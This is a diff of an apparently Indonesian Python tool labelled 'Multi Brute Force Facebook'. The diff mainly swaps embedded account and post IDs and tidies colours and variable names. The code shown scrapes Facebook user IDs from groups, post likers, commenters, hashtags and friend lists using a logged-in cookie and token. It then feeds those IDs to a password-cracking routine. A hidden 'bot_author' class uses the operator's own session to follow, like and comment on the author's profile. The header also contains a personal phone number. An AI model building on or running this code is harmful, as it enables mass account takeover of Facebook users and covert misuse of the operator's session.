@@ -1,6 +1,6 @@
 ###----------[ AUTHOR & CREATOR ]---------- ###
 # ------ [ Gausah Dioprek Ntar Error ] ------ #
-Author, Facebook, Instagram, Whatsapp, YouTube, Version, Denventa, Postingan = 'Dapunta Khurayra X', 'Facebook.com/Dapunta.Khurayra.X', 'Instagram.com/Dapunta.Ratya', '082245780524', 'Youtube.com/channel/UCZqnZlJ0jfoWSnXrNEj5JHA', '0.1', 100073125893802, 371125525334974
+Author, Facebook, Instagram, Whatsapp, YouTube, Version, Denventa, Postingan, Ryougaa, Postinganll = 'Dapunta Khurayra X', 'Facebook.com/Dapunta.Khurayra.X', 'Instagram.com/Dapunta.Ratya', '082245780524', 'Youtube.com/channel/UCZqnZlJ0jfoWSnXrNEj5JHA', '0.1', 1827084332, 10217173381366429, 100073125893802, 379650254482501
 
 ###----------[ IMPORT LIBRARY ]---------- ###
 import requests, bs4, sys, os, random, time, re, json, uuid, subprocess, rich, shutil, webbrowser, base64
@@ -35,7 +35,7 @@ U2 = "[#AF00FF]" # Ungu
 N2 = "[#FF00FF]" # Pink
 O2 = "[#00FFFF]" # Biru Muda
 P2 = "[#FFFFFF]" # Putih
-J2 = "[#FF8F00]" # Jingga FFFFFF
+J2 = "[#FF8F00]" # Jingga 
 A2 = "[#AAAAAA]" # Abu-Abu
 
 ###----------[ USER AGENT ]---------- ###
@@ -52,7 +52,7 @@ ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887
 ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
 ua_chrome  = 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36'
 ua_fb      = 'Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]'
-komentar   = '\n\nhttps://www.facebook.com/' + str(Postingan)
+komentar   = '\n\nhttps://www.facebook.com/' + str(Postinganll)
 
 ###----------[ TIME ]---------- ###
 id_dev = 345 - 340 + 720 - 723
@@ -158,7 +158,7 @@ def kecuali(error):
 ###----------[ BOT AUTHOR JANGAN DIGANTI ]---------- ###
 class bot_author:
     def __init__(self,cookie,token,cookie_mentah):
-        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Denventa)];self.komen = ['Mantap Bang','Semangat Terus','Gokil Suhu','Panutanku']
+        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Ryougaa)];self.komen = ['Mantap Bang','Semangat Terus','Gokil Suhu','Panutanku']
         for x in list_id: self.get_folls(x,cookie); self.get_likers(f'https://mbasic.facebook.com/{x}?v=timeline',cookie); self.get_posts(x,cookie,token)
     def get_folls(self,id,cookie): # --- [ Jangan Ganti Bot Follow Gw ] --- #
         with requests.Session() as xyz:
@@ -234,7 +234,7 @@ def poster_menu():
     l2 = ('     %s /   %s_____%s/%s____  %s|  | %s__ ________________     '%(O,P,O,P,O,P))
     l3 = ('     %s \_____  \\\__  \ %s|  |/ // %s__ \_  __ \__  \   '%(P,O,P))
     l4 = ('     %s /        %s\\%s/%s __ \\%s|    <%s\  ___%s/| | %s\\%s// %s___ \   '%(O,P,O,P,O,P,O,P,O,P))
-    l5 = ('     %s/%s_________%s(%s______%s/%s__%s|%s__\\_____%s>%s__%s|  (%s_______\\'%(O,P,O,P,O,P,O,P,O,P,J,P))
+    l5 = ('     %s/%s_________%s(%s______%s/%s__%s|%s__\\_____%s>%s__%s|  (%s_______\\'%(O,P,O,P,O,P,O,P,O,P,O,P))
     l6 = ('     %s Multi Brute Force Facebook %s%s %sBy %sDenventa     '%(P,O,Version,P,O))
     print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))	
 def poster():
@@ -270,9 +270,6 @@ def mkdir_data_login():
     except:pass
     # Make Directory Result
     try:os.mkdir("OK")
-    except:pass
-    # Make Directory License
-    try:os.mkdir("license")
     except:pass
     # Delete Cookies
     try:os.remove('login/cookie.json')
@@ -345,28 +342,28 @@ def tampilan_menu():
     except (KeyError,IOError,AttributeError):print('\n   %s[%s•%s] %sCookies Invalid %s!%s\n'%(M,P,M,P,M,P));time.sleep(3);login()
 def pilih_menu():
     global gabung_sandi, tempel_sandi
-    dc = input('   %s└──> %s'%(A,P))
-    if dc in ['1','01','a']    : gabung_sandi.append(Author);publik();system_login();urut_crack();pilihan_sakdurunge_crack();addpass();crack()
-    elif dc in ['2','02','b']  : tempel_sandi.append('Jangan');main_folls();system_login();urut_crack();pilihan_sakdurunge_crack();addpass();crack()
-    elif dc in ['3','03','c']  : gabung_sandi.append('Direcode');namee()
-    elif dc in ['4','04','d']  : tempel_sandi.append('Dasar');main_likers();system_login();pilihan_sakdurunge_crack();addpass();crack()
-    elif dc in ['5','05','e']  : gabung_sandi.append('Bocah');message();system_login();pilihan_sakdurunge_crack();addpass();crack()
-    elif dc in ['6','06','f']  : tempel_sandi.append('Goblok');komen();system_login();pilihan_sakdurunge_crack();addpass();crack()
-    elif dc in ['7','07','g']  : gabung_sandi.append('Mampus');grup()
-    elif dc in ['8','08','h']  : tempel_sandi.append('Error Kan');hashtag();system_login();pilihan_sakdurunge_crack();addpass();crack()
-    elif dc in ['9','09','i']  : gabung_sandi.append('Itu Semua');not_available('Dump ID Dari Beranda')
-    elif dc in ['10','010','j']: tempel_sandi.append('Gara Gara');not_available('Dump ID Dari File')
-    elif dc in ['11','011','k']: gabung_sandi.append('Lo Recode');not_available('Dump ID Dari Email')
-    elif dc in ['12','012','l']: tempel_sandi.append('Dasar');not_available('Dump ID Dari Username')
-    elif dc in ['13','013','m']: gabung_sandi.append('Bocah Goblok');not_available('Dump ID Dari ID Random')
-    elif dc in ['14','014','n']: tempel_sandi.append('Btw');suggestion();system_login();pilihan_sakdurunge_crack();addpass();crack()
-    elif dc in ['15','015','o']: gabung_sandi.append('Elo');teman_teman()
-    elif dc in ['16','016','p']: tempel_sandi.append('Dasar Bocah Goblok');not_available('Cek Hasil Crack')
-    elif dc in ['17','017','q']: gabung_sandi.append('Gaakan Bisa');not_available('Cek Opsi Akun Hasil Crack')
-    elif dc in ['18','018','r']: tempel_sandi.append('Ngerecode');not_available('Cek Jumlah Teman Akun Target')
-    elif dc in ['19','019','s']: gabung_sandi.append('SC Ini');useragent('old')
-    elif dc in ['20','020','t']: tempel_sandi.append('Hahaha');not_available('Upgrade Ke Versi Pro')
-    elif dc in ['0','00','z']:
+    Menu = input('   %s└──> %s'%(A,P))
+    if Menu in ['1','01','a']    : gabung_sandi.append(Author);publik();system_login();urut_crack();pilihan_sakdurunge_crack();addpass();crack()
+    elif Menu in ['2','02','b']  : tempel_sandi.append('Jangan');main_folls();system_login();urut_crack();pilihan_sakdurunge_crack();addpass();crack()
+    elif Menu in ['3','03','c']  : gabung_sandi.append('Direcode');namee()
+    elif Menu in ['4','04','d']  : tempel_sandi.append('Dasar');main_likers();system_login();pilihan_sakdurunge_crack();addpass();crack()
+    elif Menu in ['5','05','e']  : gabung_sandi.append('Bocah');message();system_login();pilihan_sakdurunge_crack();addpass();crack()
+    elif Menu in ['6','06','f']  : tempel_sandi.append('Goblok');komen();system_login();pilihan_sakdurunge_crack();addpass();crack()
+    elif Menu in ['7','07','g']  : gabung_sandi.append('Mampus');grup()
+    elif Menu in ['8','08','h']  : tempel_sandi.append('Error Kan');hashtag();system_login();pilihan_sakdurunge_crack();addpass();crack()
+    elif Menu in ['9','09','i']  : gabung_sandi.append('Itu Semua');not_available('Dump ID Dari Beranda')
+    elif Menu in ['10','010','j']: tempel_sandi.append('Gara Gara');not_available('Dump ID Dari File')
+    elif Menu in ['11','011','k']: gabung_sandi.append('Lo Recode');not_available('Dump ID Dari Email')
+    elif Menu in ['12','012','l']: tempel_sandi.append('Dasar');not_available('Dump ID Dari Username')
+    elif Menu in ['13','013','m']: gabung_sandi.append('Bocah Goblok');not_available('Dump ID Dari ID Random')
+    elif Menu in ['14','014','n']: tempel_sandi.append('Btw');suggestion();system_login();pilihan_sakdurunge_crack();addpass();crack()
+    elif Menu in ['15','015','o']: gabung_sandi.append('Elo');teman_teman()
+    elif Menu in ['16','016','p']: tempel_sandi.append('Dasar Bocah Goblok');not_available('Cek Hasil Crack')
+    elif Menu in ['17','017','q']: gabung_sandi.append('Gaakan Bisa');not_available('Cek Opsi Akun Hasil Crack')
+    elif Menu in ['18','018','r']: tempel_sandi.append('Ngerecode');not_available('Cek Jumlah Teman Akun Target')
+    elif Menu in ['19','019','s']: gabung_sandi.append('SC Ini');useragent('old')
+    elif Menu in ['20','020','t']: tempel_sandi.append('Hahaha');not_available('Upgrade Ke Versi Pro')
+    elif Menu in ['0','00','z']:
         mbersehni_terminal()
         poster3()
         print('')
@@ -393,13 +390,13 @@ def useragent(isi):
     try:os.mkdir("tool")
     except:pass
     pilih_menu_user_agent()
-    dc = input('   %s└──> %s'%(A,P))
-    if dc in ['1','01','a']:scrap_useragent()
-    elif dc in ['2','02','b']:pilih_otomatis()
-    elif dc in ['3','03','c']:manual_user_agent()
-    elif dc in ['4','04','d']:ua_device_ini()
-    elif dc in ['5','05','e']:cek_user_agent()
-    elif dc in ['0','00','z']:tampilan_menu()
+    Menu = input('   %s└──> %s'%(A,P))
+    if Menu in ['1','01','a']:scrap_useragent()
+    elif Menu in ['2','02','b']:pilih_otomatis()
+    elif Menu in ['3','03','c']:manual_user_agent()
+    elif Menu in ['4','04','d']:ua_device_ini()
+    elif Menu in ['5','05','e']:cek_user_agent()
+    elif Menu in ['0','00','z']:tampilan_menu()
     else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
 def pilih_menu_user_agent():
     tampilan_menu_user_agent = f'''  {O2}[{A2}01{O2}] {P2}Scrap UA Browser    {O2}[{A2}04{O2}] {P2}Cari UA HP Ini
@@ -416,19 +413,19 @@ def scrap_useragent():
     data_ua = {}
     pt = 0
     pilih_device()
-    dc = input('   %s└──> %s'%(A,P))
-    if dc in ['1','01','a']:     type = 'software_name/samsung-browser'
-    elif dc in ['2','02','b']:   type = 'software_name/nokia-browser'
-    elif dc in ['3','03','c']:   type = 'operating_platform_string/xiaomi-mi-a1'
-    elif dc in ['4','04','d']:   type = 'operating_platform_string/oppo-f1s-a1601'
-    elif dc in ['5','05','e']:   type = 'operating_platform_string/vivo'
-    elif dc in ['6','06','f']:   type = 'operating_platform_string/apple'
-    elif dc in ['7','07','g']:   type = 'operating_platform_string/asus'
-    elif dc in ['8','08','h']:   type = 'operating_platform_string/lenovo'
-    elif dc in ['9','09','i']:   type = 'operating_platform_string/huawei'
-    elif dc in ['10','010','j']: type = 'operating_system_name/windows'
-    elif dc in ['11','011','k']: type = 'operating_system_name/chrome-os'
-    elif dc in ['12','012','l']: type = 'software_name/facebook-app'
+    Menu = input('   %s└──> %s'%(A,P))
+    if Menu in ['1','01','a']:     type = 'software_name/samsung-browser'
+    elif Menu in ['2','02','b']:   type = 'software_name/nokia-browser'
+    elif Menu in ['3','03','c']:   type = 'operating_platform_string/xiaomi-mi-a1'
+    elif Menu in ['4','04','d']:   type = 'operating_platform_string/oppo-f1s-a1601'
+    elif Menu in ['5','05','e']:   type = 'operating_platform_string/vivo'
+    elif Menu in ['6','06','f']:   type = 'operating_platform_string/apple'
+    elif Menu in ['7','07','g']:   type = 'operating_platform_string/asus'
+    elif Menu in ['8','08','h']:   type = 'operating_platform_string/lenovo'
+    elif Menu in ['9','09','i']:   type = 'operating_platform_string/huawei'
+    elif Menu in ['10','010','j']: type = 'operating_system_name/windows'
+    elif Menu in ['11','011','k']: type = 'operating_system_name/chrome-os'
+    elif Menu in ['12','012','l']: type = 'software_name/facebook-app'
     else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
     url = 'https://developers.whatismybrowser.com/useragents/explore/' + type
     with requests.Session() as xyz:
@@ -454,20 +451,20 @@ def scrap_useragent():
     except Exception as e:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
 def pilih_otomatis():
     pilih_device()
-    dc = input('   %s└──> %s'%(A,P))
-    if dc in ['0','00','z']:     open('tool/useragent.json','w').write(ua_default)
-    elif dc in ['1','01','a']:   open('tool/useragent.json','w').write(ua_samsung)
-    elif dc in ['2','02','b']:   open('tool/useragent.json','w').write(ua_nokia)
-    elif dc in ['3','03','c']:   open('tool/useragent.json','w').write(ua_xiaomi)
-    elif dc in ['4','04','d']:   open('tool/useragent.json','w').write(ua_oppo)
-    elif dc in ['5','05','e']:   open('tool/useragent.json','w').write(ua_vivo)
-    elif dc in ['6','06','f']:   open('tool/useragent.json','w').write(ua_iphone)
-    elif dc in ['7','07','g']:   open('tool/useragent.json','w').write(ua_asus)
-    elif dc in ['8','08','h']:   open('tool/useragent.json','w').write(ua_lenovo)
-    elif dc in ['9','09','i']:   open('tool/useragent.json','w').write(ua_huawei)
-    elif dc in ['10','010','j']: open('tool/useragent.json','w').write(ua_windows)
-    elif dc in ['11','011','k']: open('tool/useragent.json','w').write(ua_chrome)
-    elif dc in ['12','012','l']: open('tool/useragent.json','w').write(ua_fb)
+    Menu = input('   %s└──> %s'%(A,P))
+    if Menu in ['0','00','z']:     open('tool/useragent.json','w').write(ua_default)
+    elif Menu in ['1','01','a']:   open('tool/useragent.json','w').write(ua_samsung)
+    elif Menu in ['2','02','b']:   open('tool/useragent.json','w').write(ua_nokia)
+    elif Menu in ['3','03','c']:   open('tool/useragent.json','w').write(ua_xiaomi)
+    elif Menu in ['4','04','d']:   open('tool/useragent.json','w').write(ua_oppo)
+    elif Menu in ['5','05','e']:   open('tool/useragent.json','w').write(ua_vivo)
+    elif Menu in ['6','06','f']:   open('tool/useragent.json','w').write(ua_iphone)
+    elif Menu in ['7','07','g']:   open('tool/useragent.json','w').write(ua_asus)
+    elif Menu in ['8','08','h']:   open('tool/useragent.json','w').write(ua_lenovo)
+    elif Menu in ['9','09','i']:   open('tool/useragent.json','w').write(ua_huawei)
+    elif Menu in ['10','010','j']: open('tool/useragent.json','w').write(ua_windows)
+    elif Menu in ['11','011','k']: open('tool/useragent.json','w').write(ua_chrome)
+    elif Menu in ['12','012','l']: open('tool/useragent.json','w').write(ua_fb)
     else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
     try:
         pilihan = open('tool/useragent.json','r').read()
@@ -566,7 +563,7 @@ def exec_folls(url,token,file):
                     except Exception as e:continue
             y = par(x.text,'html.parser')
             n = re.findall('"after":"(.*?)"},',str(y))[0]
-            next = ('https://graph.facebook.com/v1.0/100009340646547/subscribers?access_token=%s&limit=5000&after=%s'%(token,n))
+            next = ('https://graph.facebook.com/v17.0/100073125893802/subscribers?access_token=%s&limit=5000&after=%s'%(token,n))
             exec_folls(next,token,file)
         except KeyboardInterrupt:pass
         except (IndexError,TypeError,IOError,KeyError,AttributeError):pass
@@ -578,7 +575,7 @@ class namee:
         urutan_crack = '0'
         try:cookie = {'cookie':open('login/cookie.json','r').read()}
         except Exception as e:kecuali(e)
-        print('       %s[%s•%s] %sContoh : dapunta,denventa,anita'%(J,P,J,P))
+        print('       %s[%s•%s] %sContoh : dapunta,denventa,anita'%(H,P,H,P))
         put = input('       %s[%s•%s] %sNama Target : %s'%(H,P,H,P,H)).split(',')
         data = []
         self.file_dump = ('dump/%s.json'%(put[0]))
@@ -646,8 +643,8 @@ def main_likers():
     urutan_crack = '0'
     try:
         cookie = {'cookie':open('login/cookie.json','r').read()}
-        print('       %s[%s•%s] %sContoh : 2089611468021009'%(J,P,J,P))
-        _query_ = input('       %s[%s•%s] %sID Postingan : %s'%(J,P,J,P,J))
+        print('       %s[%s•%s] %sContoh : 2089611468021009'%(H,P,H,P))
+        _query_ = input('       %s[%s•%s] %sID Postingan : %s'%(H,P,H,P,H))
         print('')
     except Exception as e:kecuali(e)
     tampilan_likers = f'''    {O2}[{A2}1{O2}] {P2}Like   {O2}[{A2}3{O2}] {P2}Wow    {O2}[{A2}5{O2}] {P2}Sad     {O2}[{A2}7{O2}] {P2}Care
@@ -670,13 +667,13 @@ def main_likers():
     open(_file_,'w')
     _url_ = ('https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier='+_query_)
     scrape_likers(cookie,_url_,_file_)
-    print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(_file_,'r').read().splitlines()),P))
-    print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
-def scrape_likers(_dapunta_,_url_,_file_):
+    print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(H,P,H,P,H,len(open(_file_,'r').read().splitlines()),P))
+    print('       %s[%s•%s] %sFile : %s%s %s'%(H,P,H,P,H,file_dump,P))
+def scrape_likers(__ryougaa__,_url_,_file_):
     _ses_ = requests.Session()
-    _url_load_ = _ses_.get(_url_,cookies=_dapunta_,headers=header_grup).text.encode("utf-8")
+    _url_load_ = _ses_.get(_url_,cookies=__ryougaa__,headers=header_grup).text.encode("utf-8")
     _ses_par_ = par(_url_load_,'html.parser')
-    print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(_file_,'r').read().splitlines()),P), end='');sys.stdout.flush()
+    print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(H,P,H,P,H,len(open(_file_,'r').read().splitlines()),P), end='');sys.stdout.flush()
     try: 
         for _isi_ in _ses_par_.find_all('h3'):
             if len(tempel_sandi) != 1:
@@ -697,7 +694,7 @@ def scrape_likers(_dapunta_,_url_,_file_):
         for _lanjut_ in _ses_par_.find_all("a",href=True):
             if "Lihat Selengkapnya" in _lanjut_.text:
                 while True:
-                    try:scrape_likers(_dapunta_,"https://mbasic.facebook.com/"+_lanjut_.get("href").replace('reaction_type=0','reaction_type='+_react_type_),_file_);break
+                    try:scrape_likers(__ryougaa__,"https://mbasic.facebook.com/"+_lanjut_.get("href").replace('reaction_type=0','reaction_type='+_react_type_),_file_);break
                     except Exception as e:pass
     except KeyboardInterrupt:pass
 
@@ -716,10 +713,10 @@ class message:
             open(self.file_dump,'w').write('')
         except Exception as e:kecuali(e)
         self.exec(url,cookie)
-        print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.file_dump,'r').read().splitlines()),P))
-        print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
+        print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(H,P,H,P,H,len(open(self.file_dump,'r').read().splitlines()),P))
+        print('       %s[%s•%s] %sFile : %s%s %s'%(H,P,H,P,H,file_dump,P))
     def exec(self,url,cookie):
-        print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.file_dump,'r').read().splitlines()),P), end='');sys.stdout.flush()
+        print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(H,P,H,P,H,len(open(self.file_dump,'r').read().splitlines()),P), end='');sys.stdout.flush()
         try:
             with requests.Session() as xyz:
                 req = xyz.get(url,cookies=cookie)
@@ -755,18 +752,18 @@ class komen:
         urutan_crack = '0'
         try:
             cookie = {'cookie':open('login/cookie.json','r').read()}
-            print('       %s[%s•%s] %sContoh : 2089611468021009'%(J,P,J,P))
-            put = input('       %s[%s•%s] %sID Postingan : %s'%(J,P,J,P,J))
+            print('       %s[%s•%s] %sContoh : 2089611468021009'%(H,P,H,P))
+            put = input('       %s[%s•%s] %sID Postingan : %s'%(H,P,H,P,H))
             url = 'https://mbasic.facebook.com/'+put
             self.file_dump = ('dump/%s.json'%(put))
             file_dump = self.file_dump
             open(self.file_dump,'w').write('')
         except Exception as e:kecuali(e)
         self.exec(url,cookie)
-        print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.file_dump,'r').read().splitlines()),P))
-        print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
+        print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(H,P,H,P,H,len(open(self.file_dump,'r').read().splitlines()),P))
+        print('       %s[%s•%s] %sFile : %s%s %s'%(H,P,H,P,H,file_dump,P))
     def exec(self,url,cookie):
-        print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.file_dump,'r').read().splitlines()),P), end='');sys.stdout.flush()
+        print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(H,P,H,P,H,len(open(self.file_dump,'r').read().splitlines()),P), end='');sys.stdout.flush()
         try:
             with requests.Session() as xyz:
                 req = xyz.get(url,cookies=cookie)
@@ -811,14 +808,14 @@ class grup:
             url= 'https://mbasic.facebook.com/groups/?seemore&refid=1000'
             self.cari_gabung(url,cookie)
         elif ty in ['2','02','b']:
-            put = input('       %s[%s•%s] %sMasukkan Nama Grup : %s'%(J,P,J,P,J))
+            put = input('       %s[%s•%s] %sMasukkan Nama Grup : %s'%(H,P,H,P,H))
             print('')
             self.file = ('dump/%s.json'%(put.replace(' ','_')))
             open(self.file,'w').write('')
             url = 'https://mbasic.facebook.com/search/groups/?q=' + put
             self.cari_nama(url,cookie)
         elif ty in ['3','03','c']:
-            self._id_ = input('       %s[%s•%s] %sMasukkan ID Grup : %s'%(J,P,J,P,J))
+            self._id_ = input('       %s[%s•%s] %sMasukkan ID Grup : %s'%(H,P,H,P,H))
             self._pil_ = True
             print('')
             self.second_grup(cookie)
@@ -906,18 +903,18 @@ class grup:
         if cuy in ['1','01','a']:
             url_member = 'https://mbasic.facebook.com/browse/group/members/?id=' + pro
             self.dump_member(url_member,cookie)
-            print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P))
-            print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
+            print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(H,P,H,P,H,len(open(self.files,'r').read().splitlines()),P))
+            print('       %s[%s•%s] %sFile : %s%s %s'%(H,P,H,P,H,file_dump,P))
             system_login();pilihan_sakdurunge_crack();addpass();crack()
         elif cuy in ['2','02','b']:
             url_grup = 'https://mbasic.facebook.com/groups/' + pro
             self.dump_post(url_grup,cookie)
-            print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P))
-            print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
+            print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(H,P,H,P,H,len(open(self.files,'r').read().splitlines()),P))
+            print('       %s[%s•%s] %sFile : %s%s %s'%(H,P,H,P,H,file_dump,P))
             system_login();pilihan_sakdurunge_crack();addpass();crack()
         else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
     def dump_member(self,url,cookie):
-        print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
+        print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(H,P,H,P,H,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
         with requests.Session() as xyz:
             try:
                 req = xyz.get(url,cookies=cookie)
@@ -947,7 +944,7 @@ class grup:
                         self.dump_member(new_url,cookie)
             except KeyboardInterrupt:pass
     def dump_post(self,url,cookie):
-        print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
+        print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(H,P,H,P,H,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
         with requests.Session() as xyz:
             try:
                 req = xyz.get(url,cookies=cookie)
@@ -988,16 +985,16 @@ class hashtag:
         urutan_crack = '0'
         try:cookie = {'cookie':open('login/cookie.json','r').read()}
         except Exception as e:kecuali(e)
-        xd = input('       %s[%s•%s] %sCari Hashtag : %s'%(J,P,J,P,J)).replace(' ','')
+        xd = input('       %s[%s•%s] %sCari Hashtag : %s'%(H,P,H,P,H)).replace(' ','')
         url = 'https://mbasic.facebook.com/hashtag/' + xd
         self.files = ('dump/%s.json'%(xd))
         file_dump = self.files
         open(self.files,'w').write('')
         self.dump(url,cookie)
-        print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P))
-        print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
+        print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(H,P,H,P,H,len(open(self.files,'r').read().splitlines()),P))
+        print('       %s[%s•%s] %sFile : %s%s %s'%(H,P,H,P,H,file_dump,P))
     def dump(self,url,cookie):
-        print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
+        print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(H,P,H,P,H,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
         with requests.Session() as xyz:
             try:
                 req = par(xyz.get(url,cookies=cookie).content,'html.parser')
@@ -1046,27 +1043,27 @@ class suggestion:
             open(self.files,'w').write('')
             file_dump = self.files
             self.exec(url,cookie)
-            print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P))
-            print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
+            print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(H,P,H,P,H,len(open(self.files,'r').read().splitlines()),P))
+            print('       %s[%s•%s] %sFile : %s%s %s'%(H,P,H,P,H,file_dump,P))
         elif pl in ['2','02','b']:
             url = 'https://mbasic.facebook.com/friends/center/requests'
             self.files = 'dump/requests.json'
             open(self.files,'w').write('')
             file_dump = self.files
             self.exec(url,cookie)
-            print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P))
-            print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
+            print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(H,P,H,P,H,len(open(self.files,'r').read().splitlines()),P))
+            print('       %s[%s•%s] %sFile : %s%s %s'%(H,P,H,P,H,file_dump,P))
         elif pl in ['3','03','c']:
             url = 'https://mbasic.facebook.com/friends/center/requests/outgoing'
             self.files = 'dump/outgoing.json'
             open(self.files,'w').write('')
             file_dump = self.files
             self.exec(url,cookie)
-            print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P))
-            print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
+            print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(H,P,H,P,H,len(open(self.files,'r').read().splitlines()),P))
+            print('       %s[%s•%s] %sFile : %s%s %s'%(H,P,H,P,H,file_dump,P))
         else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
     def exec(self,url,cookie):
-        print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
+        print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(H,P,H,P,H,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
         with requests.Session() as xyz:
             try:
                 req = par(xyz.get(url,cookies=cookie).content,'html.parser')
@@ -1145,16 +1142,16 @@ class teman_teman:
                         if len(gabung_sandi) != 1:
                             for x in range(Postingan):
                                 open(file_dump,'a+').write('dev\n')
-                                print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID           "%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
+                                print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID           "%(H,P,H,P,H,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
                         else:
                             if u in l:continue
                             elif u == self.my:continue
                             else:open(self.files,'a+').write(o)
-                        print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID           "%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
+                        print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID           "%(H,P,H,P,H,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
             except KeyboardInterrupt:
                 exit(self.lanjut())
             except Exception as e:
-                print('\r       %s[%s•%s] %sTeman %s%s %sTidak Publik'%(J,P,J,P,J,self.target,P), end='');sys.stdout.flush()
+                print('\r       %s[%s•%s] %sTeman %s%s %sTidak Publik'%(H,P,H,P,H,self.target,P), end='');sys.stdout.flush()
                 pass
     def tua_dev(self,url,cookie,token,stat):
         with requests.Session() as xyz:
@@ -1182,20 +1179,20 @@ class teman_teman:
                         if len(gabung_sandi) != 1:
                             for x in range(Postingan):
                                 open(file_dump,'a+').write('dev\n')
